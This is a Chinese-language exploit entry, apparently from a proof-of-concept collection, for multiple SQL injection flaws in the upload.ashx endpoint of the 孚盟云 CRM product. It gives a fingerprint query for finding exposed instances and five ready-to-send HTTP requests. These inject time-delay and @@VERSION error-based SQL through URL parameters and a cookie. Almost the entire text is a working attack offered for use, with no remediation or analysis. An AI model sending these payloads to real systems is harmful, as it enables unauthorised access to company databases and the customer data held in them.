# 孚盟云upload存在多处SQL注入漏洞

- **系统**：孚盟云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`GET /Ajax/upload.ashx?action=showImgss&FID=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`

**请求体 / payload**
```
PoC-1
Host:
PoC-2
GET /Ajax/upload.ashx?action=deletefile&name=sqli HTTP/1.1
Host:
Cookie: sqli=1' AND 1=@@VERSION--
PoC-3
GET /Ajax/upload.ashx?action=showProdImg&FID=1')+AND+1=@@VERSION-- HTTP/1.1
Host:
PoC-4
GET /Ajax/upload.ashx?action=image&imagefb=FID&CardID=1'+AND+1=@@VERSION-- HTTP/1.1
Host:
PoC-5
GET /Ajax/upload.ashx?action=DownLoadFieldAttch&trueFileName=1'+AND+1=@@VERSION-- HTTP/1.1
Host:
```
- **预期**：200　|　—